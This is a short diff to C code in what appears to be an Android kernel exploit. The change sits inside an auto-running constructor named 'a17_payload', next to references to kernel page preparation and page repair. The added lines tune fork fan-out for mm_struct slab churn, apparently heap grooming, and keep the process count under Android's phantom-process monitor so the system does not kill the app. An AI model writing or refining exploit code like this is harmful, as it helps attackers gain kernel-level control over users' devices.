@@ -81,6 +81,12 @@ __attribute__((constructor)) static void a17_payload(void) {
    * rounds so prepare_kernel_page() cannot release it before the channel is
    * available to repair the tracked pages. */
   setenv("GL_DEFER_CLOSE", "1", 1);
+  /* Android's phantom-process monitor counts native fork children and may
+   * kill the app cgroup when the default 200/400-child drain runs.  Keep the
+   * concurrent fanout below its usual 32-process ceiling while retaining
+   * repeated mm_struct slab churn. */
+  setenv("GL_SLAB_DRAIN_BATCH", "24", 1);
+  setenv("GL_SLAB_DRAIN_WAVES", "8", 1);
 
   pid_t chain = fork();
   if (chain < 0) {
